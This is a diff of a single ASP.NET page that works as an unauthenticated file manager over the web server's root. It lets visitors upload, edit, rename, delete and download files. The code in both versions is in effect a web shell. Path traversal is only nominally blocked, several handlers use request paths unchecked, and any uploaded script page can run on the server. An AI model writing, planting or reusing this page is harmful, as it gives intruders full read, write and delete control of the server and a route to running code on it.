@@ -1,351 +1,326 @@
 <%@ Page Language="C#" AutoEventWireup="true" %>
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Ultimate File Manager - Full Server Navigation</title>
-    <style>
-        body { font-family: Arial; padding: 20px; background: #f9f9f9; color: #333; }
-        .breadcrumb a { text-decoration:none; color:#0066cc; margin-right:5px; }
-        .breadcrumb a:hover { text-decoration: underline; }
-        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
-        th, td { border: 1px solid #ddd; padding: 8px; }
-        th { background: #eee; }
-        input[type=text] { width: 90%; padding: 3px; }
-        .actions button { margin-right: 5px; }
-        .upload-section, .folder-create { margin-top: 10px; margin-bottom: 15px; }
-        .preview { margin-top: 15px; padding: 10px; background: #fff; border: 1px solid #ccc; max-height: 300px; overflow:auto; }
-        img.preview-img { max-width: 100%; max-height: 280px; }
-        @media (max-width: 600px) {
-            table, th, td { font-size: 14px; }
-        }
-    </style>
-</head>
+<head><title>Simple File Manager with Edit, Rename, Create Folder</title></head>
 <body>
-    <h2>Ultimate File Manager - Full Server Navigation</h2>
+    <form runat="server" enctype="multipart/form-data">
+        <asp:Label ID="lblCurrentPath" runat="server" Text=""></asp:Label><br /><br />
 
-    <asp:Literal ID="ltBreadcrumb" runat="server"></asp:Literal>
+        <!-- Upload -->
+        <asp:FileUpload ID="fuUpload" runat="server" />
+        <asp:Button ID="btnUpload" runat="server" Text="Upload File" OnClick="btnUpload_Click" /><br /><br />
 
-    <form id="form1" runat="server" enctype="multipart/form-data">
-
-        <div class="upload-section">
-            <asp:FileUpload ID="fuUpload" runat="server" />
-            <asp:Button ID="btnUpload" runat="server" Text="Upload File" OnClick="btnUpload_Click" />
-        </div>
-
-        <div class="folder-create">
-            <asp:TextBox ID="txtNewFolder" runat="server" Placeholder="New Folder Name"></asp:TextBox>
-            <asp:Button ID="btnCreateFolder" runat="server" Text="Create Folder" OnClick="btnCreateFolder_Click" />
-        </div>
+        <!-- Create Folder -->
+        Folder Name: <asp:TextBox ID="txtNewFolder" runat="server" />
+        <asp:Button ID="btnCreateFolder" runat="server" Text="Create Folder" OnClick="btnCreateFolder_Click" /><br /><br />
 
         <asp:Label ID="lblMessage" runat="server" ForeColor="Green"></asp:Label>
-        <asp:Label ID="lblError" runat="server" ForeColor="Red"></asp:Label>
+        <asp:Label ID="lblError" runat="server" ForeColor="Red"></asp:Label><br />
 
-        <asp:HiddenField ID="hfCurrentPath" runat="server" />
+        <asp:Literal ID="ltFiles" runat="server"></asp:Literal>
 
-        <asp:Repeater ID="rptFiles" runat="server">
-            <HeaderTemplate>
-                <table>
-                    <tr>
-                        <th>Name</th>
-                        <th>Type</th>
-                        <th>Size (KB)</th>
-                        <th>Actions</th>
-                    </tr>
-            </HeaderTemplate>
-            <ItemTemplate>
-                <tr>
-                    <td>
-                        <%# Eval("IsDirectory") ? 
-                            ("<a href='?path=" + Eval("RelativePath") + "'>" + Eval("Name") + "</a>") : 
-                            Eval("Name") %>
-                    </td>
-                    <td><%# Eval("IsDirectory") ? "Folder" : "File" %></td>
-                    <td><%# Eval("IsDirectory") ? "-" : (Math.Round(Convert.ToDouble(Eval("Size")) / 1024, 2).ToString()) %></td>
-                    <td class="actions">
-                        <% if (!(bool)Eval("IsDirectory")) { %>
-                            <asp:Button ID="btnDownload_<%# Container.ItemIndex %>" runat="server" Text="Download" CommandArgument='<%# Eval("RelativePath") %>' OnClick="btnDownload_Click" />
-                        <% } %>
-                        <asp:Button ID="btnDelete_<%# Container.ItemIndex %>" runat="server" Text="Delete" CommandArgument='<%# Eval("RelativePath") %>' OnClick="btnDelete_Click" OnClientClick="return confirm('Are you sure?');" />
-                        <asp:TextBox ID="txtRename_<%# Container.ItemIndex %>" runat="server" Text='<%# Eval("Name") %>' Width="120px" />
-                        <asp:Button ID="btnRename_<%# Container.ItemIndex %>" runat="server" Text="Rename" CommandArgument='<%# Eval("RelativePath") %>' OnClick="btnRename_Click" />
-                    </td>
-                </tr>
-            </ItemTemplate>
-            <FooterTemplate>
-                </table>
-            </FooterTemplate>
-        </asp:Repeater>
+        <!-- File edit area -->
+        <asp:Panel ID="pnlEdit" runat="server" Visible="false" style="margin-top:20px; border:1px solid #ccc; padding:10px; width:80%;">
+            <asp:Label ID="lblEditFileName" runat="server" Text=""></asp:Label><br /><br />
+            <asp:TextBox ID="txtFileContent" runat="server" TextMode="MultiLine" Rows="15" Columns="80"></asp:TextBox><br /><br />
+            <asp:Button ID="btnSaveEdit" runat="server" Text="Save File" OnClick="btnSaveEdit_Click" />
+            <asp:Button ID="btnCancelEdit" runat="server" Text="Cancel" OnClick="btnCancelEdit_Click" />
+        </asp:Panel>
+
+        <asp:HiddenField ID="hfPath" runat="server" />
+        <asp:HiddenField ID="hfEditFilePath" runat="server" />
 
     </form>
 
 <script runat="server">
 
-    string RootPath;
-    string CurrentPath;
-    string CurrentPhysicalPath;
+string RootPath = "";
+string CurrentPath = "";
 
-    protected void Page_Load(object sender, EventArgs e)
+protected void Page_Load(object sender, EventArgs e)
+{
+    RootPath = Server.MapPath("/");
+    CurrentPath = Request.QueryString["path"] ?? "";
+    CurrentPath = CurrentPath.Replace("..", ""); // Basic security
+
+    hfPath.Value = CurrentPath;
+
+    lblCurrentPath.Text = "Current Path: " + (string.IsNullOrEmpty(CurrentPath) ? RootPath : Server.MapPath(CurrentPath));
+
+    if (!IsPostBack)
     {
-        // Server root folder set as RootPath
-        RootPath = Server.MapPath("/");
-
-        string requestedPath = Request.QueryString["path"];
-        if (!IsPostBack)
-        {
-            if (string.IsNullOrEmpty(requestedPath))
-                CurrentPath = "";
-            else
-            {
-                requestedPath = requestedPath.Replace("..", ""); // Simple security
-                CurrentPath = requestedPath;
-            }
-            hfCurrentPath.Value = CurrentPath;
-            BuildBreadcrumb();
-            LoadFilesAndFolders();
-        }
-        else
-        {
-            CurrentPath = hfCurrentPath.Value;
-        }
+        ShowFilesAndFolders();
     }
 
-    void BuildBreadcrumb()
+    // Handle Download
+    string download = Request.QueryString["download"];
+    if (!string.IsNullOrEmpty(download))
     {
-        var parts = CurrentPath.Split(new char[] { '/', '\\' }, StringSplitOptions.RemoveEmptyEntries);
-        string pathAccumulate = "";
-        System.Text.StringBuilder sb = new System.Text.StringBuilder();
-        sb.Append("<div class='breadcrumb'>");
-        sb.Append("<a href='?path='>Root</a>");
-
-        for (int i = 0; i < parts.Length; i++)
-        {
-            pathAccumulate += (pathAccumulate == "" ? "" : "/") + parts[i];
-            sb.Append(" / <a href='?path=" + pathAccumulate + "'>" + parts[i] + "</a>");
-        }
-        sb.Append("</div>");
-        ltBreadcrumb.Text = sb.ToString();
-    }
-
-    void LoadFilesAndFolders()
-    {
-        CurrentPhysicalPath = System.IO.Path.Combine(RootPath, CurrentPath.Replace("/", "\\"));
-
-        // Security check: prevent going outside RootPath
-        if (!CurrentPhysicalPath.StartsWith(RootPath))
-        {
-            CurrentPhysicalPath = RootPath;
-            CurrentPath = "";
-        }
-
-        var items = new System.Collections.Generic.List<FileItem>();
-
-        // Add Parent folder if not root
-        if (!string.IsNullOrEmpty(CurrentPath))
-        {
-            string parentPath = System.IO.Path.GetDirectoryName(CurrentPath.Replace("/", "\\")).Replace("\\", "/");
-            items.Add(new FileItem { Name = ".. (Parent Folder)", RelativePath = parentPath, IsDirectory = true, Size = 0, IsParent = true });
-        }
-
-        // Directories
-        foreach (var dir in System.IO.Directory.GetDirectories(CurrentPhysicalPath))
-        {
-            var di = new System.IO.DirectoryInfo(dir);
-            string relative = GetRelativePath(dir);
-            items.Add(new FileItem
-            {
-                Name = di.Name,
-                RelativePath = relative,
-                IsDirectory = true,
-                Size = 0
-            });
-        }
-
-        // Files
-        foreach (var file in System.IO.Directory.GetFiles(CurrentPhysicalPath))
-        {
-            var fi = new System.IO.FileInfo(file);
-            string relative = GetRelativePath(file);
-            items.Add(new FileItem
-            {
-                Name = fi.Name,
-                RelativePath = relative,
-                IsDirectory = false,
-                Size = fi.Length
-            });
-        }
-
-        rptFiles.DataSource = items;
-        rptFiles.DataBind();
-
-        lblMessage.Text = "";
-        lblError.Text = "";
-    }
-
-    string GetRelativePath(string fullPath)
-    {
-        if (fullPath.StartsWith(RootPath))
-            return fullPath.Substring(RootPath.Length).TrimStart('\\').Replace("\\", "/");
-        return fullPath;
-    }
-
-    protected void btnUpload_Click(object sender, EventArgs e)
-    {
-        lblMessage.Text = "";
-        lblError.Text = "";
-
-        if (fuUpload.HasFile)
-        {
-            try
-            {
-                string fileName = System.IO.Path.GetFileName(fuUpload.FileName);
-                string savePath = System.IO.Path.Combine(CurrentPhysicalPath, fileName);
-
-                if (System.IO.File.Exists(savePath))
-                {
-                    lblError.Text = "File already exists.";
-                    return;
-                }
-
-                fuUpload.SaveAs(savePath);
-                lblMessage.Text = "File uploaded successfully.";
-                LoadFilesAndFolders();
-            }
-            catch (Exception ex)
-            {
-                lblError.Text = "Upload failed: " + ex.Message;
-            }
-        }
-        else
-        {
-            lblError.Text = "No file selected.";
-        }
-    }
-
-    protected void btnCreateFolder_Click(object sender, EventArgs e)
-    {
-        lblMessage.Text = "";
-        lblError.Text = "";
-
-        string newFolderName = txtNewFolder.Text.Trim();
-        if (string.IsNullOrEmpty(newFolderName))
-        {
-            lblError.Text = "Folder name cannot be empty.";
-            return;
-        }
-
-        string newFolderPath = System.IO.Path.Combine(CurrentPhysicalPath, newFolderName);
-        if (System.IO.Directory.Exists(newFolderPath))
-        {
-            lblError.Text = "Folder already exists.";
-            return;
-        }
-
-        try
-        {
-            System.IO.Directory.CreateDirectory(newFolderPath);
-            lblMessage.Text = "Folder created successfully.";
-            txtNewFolder.Text = "";
-            LoadFilesAndFolders();
-        }
-        catch (Exception ex)
-        {
-            lblError.Text = "Failed to create folder: " + ex.Message;
-        }
-    }
-
-    protected void btnDelete_Click(object sender, EventArgs e)
-    {
-        var btn = (System.Web.UI.WebControls.Button)sender;
-        string relativePath = btn.CommandArgument;
-        string fullPath = System.IO.Path.Combine(RootPath, relativePath.Replace("/", "\\"));
-
-        try
-        {
-            if (System.IO.Directory.Exists(fullPath))
-                System.IO.Directory.Delete(fullPath, true);
-            else if (System.IO.File.Exists(fullPath))
-                System.IO.File.Delete(fullPath);
-
-            lblMessage.Text = "Deleted successfully.";
-            LoadFilesAndFolders();
-        }
-        catch (Exception ex)
-        {
-            lblError.Text = "Delete failed: " + ex.Message;
-        }
-    }
-
-    protected void btnRename_Click(object sender, EventArgs e)
-    {
-        var btn = (System.Web.UI.WebControls.Button)sender;
-        string oldRelativePath = btn.CommandArgument;
-
-        var item = rptFiles.Items[btn.NamingContainer.ItemIndex];
-        var txtRename = (System.Web.UI.WebControls.TextBox)item.FindControl("txtRename_" + btn.NamingContainer.ItemIndex);
-
-        if (txtRename == null)
-            return;
-
-        string newName = txtRename.Text.Trim();
-        if (string.IsNullOrEmpty(newName))
-        {
-            lblError.Text = "Name cannot be empty.";
-            return;
-        }
-
-        string oldFullPath = System.IO.Path.Combine(RootPath, oldRelativePath.Replace("/", "\\"));
-        string newFullPath = System.IO.Path.Combine(System.IO.Path.GetDirectoryName(oldFullPath), newName);
-
-        try
-        {
-            if (System.IO.File.Exists(newFullPath) || System.IO.Directory.Exists(newFullPath))
-            {
-                lblError.Text = "A file or folder with that name already exists.";
-                return;
-            }
-
-            if (System.IO.Directory.Exists(oldFullPath))
-                System.IO.Directory.Move(oldFullPath, newFullPath);
-            else if (System.IO.File.Exists(oldFullPath))
-                System.IO.File.Move(oldFullPath, newFullPath);
-
-            lblMessage.Text = "Renamed successfully.";
-            LoadFilesAndFolders();
-        }
-        catch (Exception ex)
-        {
-            lblError.Text = "Rename failed: " + ex.Message;
-        }
-    }
-
-    protected void btnDownload_Click(object sender, EventArgs e)
-    {
-        var btn = (System.Web.UI.WebControls.Button)sender;
-        string relativePath = btn.CommandArgument;
-        string fullPath = System.IO.Path.Combine(RootPath, relativePath.Replace("/", "\\"));
-
-        if (System.IO.File.Exists(fullPath))
+        string filePath = System.IO.Path.Combine(RootPath, download.Replace("/", "\\"));
+        if (System.IO.File.Exists(filePath))
         {
             Response.Clear();
             Response.ContentType = "application/octet-stream";
-            Response.AppendHeader("Content-Disposition", "attachment; filename=" + System.IO.Path.GetFileName(fullPath));
-            Response.TransmitFile(fullPath);
+            Response.AppendHeader("Content-Disposition", "attachment; filename=" + System.IO.Path.GetFileName(filePath));
+            Response.TransmitFile(filePath);
             Response.End();
-        }
-        else
-        {
-            lblError.Text = "File not found.";
         }
     }
 
-    class FileItem
+    // Handle Delete
+    string del = Request.QueryString["delete"];
+    if (!string.IsNullOrEmpty(del))
     {
-        public string Name { get; set; }
-        public string RelativePath { get; set; }
-        public bool IsDirectory { get; set; }
-        public long Size { get; set; }
-        public bool IsParent { get; set; }
+        string filePath = System.IO.Path.Combine(RootPath, del.Replace("/", "\\"));
+        try
+        {
+            if (System.IO.Directory.Exists(filePath))
+                System.IO.Directory.Delete(filePath, true);
+            else if (System.IO.File.Exists(filePath))
+                System.IO.File.Delete(filePath);
+            lblMessage.Text = "Deleted successfully.";
+        }
+        catch (Exception ex)
+        {
+            lblError.Text = "Delete error: " + ex.Message;
+        }
+        ShowFilesAndFolders();
     }
+
+    // Handle Edit (show edit panel)
+    string edit = Request.QueryString["edit"];
+    if (!string.IsNullOrEmpty(edit))
+    {
+        string filePath = System.IO.Path.Combine(RootPath, edit.Replace("/", "\\"));
+        if (System.IO.File.Exists(filePath))
+        {
+            hfEditFilePath.Value = edit;
+            lblEditFileName.Text = "Editing: " + edit;
+            txtFileContent.Text = System.IO.File.ReadAllText(filePath);
+            pnlEdit.Visible = true;
+        }
+    }
+}
+
+void ShowFilesAndFolders()
+{
+    try
+    {
+        string fullPath = System.IO.Path.Combine(RootPath, CurrentPath.Replace("/", "\\"));
+        if (!fullPath.StartsWith(RootPath)) fullPath = RootPath; // Security
+
+        System.Text.StringBuilder sb = new System.Text.StringBuilder();
+        sb.Append("<table border='1' cellpadding='5'><tr><th>Name</th><th>Type</th><th>Rename</th><th>Actions</th></tr>");
+
+        // Parent folder link
+        if (!string.IsNullOrEmpty(CurrentPath))
+        {
+            string parent = System.IO.Path.GetDirectoryName(CurrentPath.Replace("/", "\\")).Replace("\\", "/");
+            sb.Append($"<tr><td><a href='?path={parent}'>.. (Parent Folder)</a></td><td>Folder</td><td></td><td></td></tr>");
+        }
+
+        // Directories
+        int idx = 0;
+        foreach (string dir in System.IO.Directory.GetDirectories(fullPath))
+        {
+            string name = new System.IO.DirectoryInfo(dir).Name;
+            string rel = CombinePath(CurrentPath, name);
+            sb.Append("<tr>");
+            sb.Append($"<td><a href='?path={rel}'>{name}</a></td>");
+            sb.Append("<td>Folder</td>");
+            // Rename inline form
+            sb.Append("<td>");
+            sb.Append($"<form method='post' style='margin:0;'>");
+            sb.Append($"<input type='hidden' name='oldname' value='{rel}' />");
+            sb.Append($"<input type='text' name='newname' value='{name}' style='width:120px;' />");
+            sb.Append($"<input type='submit' name='rename' value='Rename' />");
+            sb.Append("</form>");
+            sb.Append("</td>");
+            sb.Append("<td>");
+            sb.Append($"<a href='?delete={rel}' onclick=\"return confirm('Delete folder {name}?');\">Delete</a>");
+            sb.Append("</td>");
+            sb.Append("</tr>");
+            idx++;
+        }
+
+        // Files
+        foreach (string file in System.IO.Directory.GetFiles(fullPath))
+        {
+            string name = System.IO.Path.GetFileName(file);
+            string rel = CombinePath(CurrentPath, name);
+
+            sb.Append("<tr>");
+            sb.Append($"<td>{name}</td>");
+            sb.Append("<td>File</td>");
+            // Rename inline form
+            sb.Append("<td>");
+            sb.Append($"<form method='post' style='margin:0;'>");
+            sb.Append($"<input type='hidden' name='oldname' value='{rel}' />");
+            sb.Append($"<input type='text' name='newname' value='{name}' style='width:120px;' />");
+            sb.Append($"<input type='submit' name='rename' value='Rename' />");
+            sb.Append("</form>");
+            sb.Append("</td>");
+            sb.Append("<td>");
+            sb.Append($"<a href='?download={rel}'>Download</a> | ");
+            sb.Append($"<a href='?edit={rel}'>Edit</a> | ");
+            sb.Append($"<a href='?delete={rel}' onclick=\"return confirm('Delete file {name}?');\">Delete</a>");
+            sb.Append("</td>");
+            sb.Append("</tr>");
+        }
+
+        sb.Append("</table>");
+        ltFiles.Text = sb.ToString();
+    }
+    catch (Exception ex)
+    {
+        lblError.Text = "Error: " + ex.Message;
+    }
+}
+
+string CombinePath(string basePath, string add)
+{
+    if (string.IsNullOrEmpty(basePath)) return add;
+    return basePath.TrimEnd('/') + "/" + add;
+}
+
+protected void btnUpload_Click(object sender, EventArgs e)
+{
+    lblMessage.Text = "";
+    lblError.Text = "";
+
+    if (!fuUpload.HasFile)
+    {
+        lblError.Text = "Select a file first.";
+        return;
+    }
+
+    try
+    {
+        string fullPath = System.IO.Path.Combine(RootPath, CurrentPath.Replace("/", "\\"));
+        if (!fullPath.StartsWith(RootPath)) fullPath = RootPath; // Security
+
+        string savePath = System.IO.Path.Combine(fullPath, System.IO.Path.GetFileName(fuUpload.FileName));
+        fuUpload.SaveAs(savePath);
+        lblMessage.Text = "File uploaded successfully.";
+    }
+    catch (Exception ex)
+    {
+        lblError.Text = "Upload error: " + ex.Message;
+    }
+
+    ShowFilesAndFolders();
+}
+
+protected void btnCreateFolder_Click(object sender, EventArgs e)
+{
+    lblMessage.Text = "";
+    lblError.Text = "";
+
+    string newFolder = txtNewFolder.Text.Trim();
+    if (string.IsNullOrEmpty(newFolder))
+    {
+        lblError.Text = "Folder name cannot be empty.";
+        return;
+    }
+
+    try
+    {
+        string fullPath = System.IO.Path.Combine(RootPath, CurrentPath.Replace("/", "\\"));
+        if (!fullPath.StartsWith(RootPath)) fullPath = RootPath; // Security
+
+        string folderPath = System.IO.Path.Combine(fullPath, newFolder);
+        if (!System.IO.Directory.Exists(folderPath))
+        {
+            System.IO.Directory.CreateDirectory(folderPath);
+            lblMessage.Text = "Folder created successfully.";
+            txtNewFolder.Text = "";
+        }
+        else
+        {
+            lblError.Text = "Folder already exists.";
+        }
+    }
+    catch (Exception ex)
+    {
+        lblError.Text = "Create folder error: " + ex.Message;
+    }
+
+    ShowFilesAndFolders();
+}
+
+protected override void OnLoadComplete(EventArgs e)
+{
+    base.OnLoadComplete(e);
+
+    // Handle Rename form post
+    if (IsPostBack && Request.Form["rename"] != null)
+    {
+        string oldName = Request.Form["oldname"];
+        string newName = Request.Form["newname"];
+
+        if (!string.IsNullOrEmpty(oldName) && !string.IsNullOrEmpty(newName))
+        {
+            oldName = oldName.Replace("/", "\\");
+            newName = newName.Replace("/", "\\");
+            string oldFullPath = System.IO.Path.Combine(RootPath, oldName);
+            string newFullPath = System.IO.Path.Combine(System.IO.Path.GetDirectoryName(oldFullPath), newName);
+
+            try
+            {
+                if (System.IO.File.Exists(newFullPath) || System.IO.Directory.Exists(newFullPath))
+                {
+                    lblError.Text = "A file or folder with that name already exists.";
+                }
+                else
+                {
+                    if (System.IO.Directory.Exists(oldFullPath))
+                        System.IO.Directory.Move(oldFullPath, newFullPath);
+                    else if (System.IO.File.Exists(oldFullPath))
+                        System.IO.File.Move(oldFullPath, newFullPath);
+
+                    lblMessage.Text = "Renamed successfully.";
+                }
+            }
+            catch (Exception ex)
+            {
+                lblError.Text = "Rename failed: " + ex.Message;
+            }
+            ShowFilesAndFolders();
+        }
+    }
+}
+
+protected void btnSaveEdit_Click(object sender, EventArgs e)
+{
+    lblMessage.Text = "";
+    lblError.Text = "";
+
+    string editPath = hfEditFilePath.Value;
+    if (string.IsNullOrEmpty(editPath))
+    {
+        lblError.Text = "No file to save.";
+        return;
+    }
+
+    try
+    {
+        string fullPath = System.IO.Path.Combine(RootPath, editPath.Replace("/", "\\"));
+        System.IO.File.WriteAllText(fullPath, txtFileContent.Text);
+        lblMessage.Text = "File saved successfully.";
+        pnlEdit.Visible = false;
+        Response.Redirect(Request.Url.GetLeftPart(UriPartial.Path) + "?path=" + CurrentPath);
+    }
+    catch (Exception ex)
+    {
+        lblError.Text = "Save failed: " + ex.Message;
+    }
+}
+
+protected void btnCancelEdit_Click(object sender, EventArgs e)
+{
+    pnlEdit.Visible = false;
+    Response.Redirect(Request.Url.GetLeftPart(UriPartial.Path) + "?path=" + CurrentPath);
+}
 
 </script>
 </body>
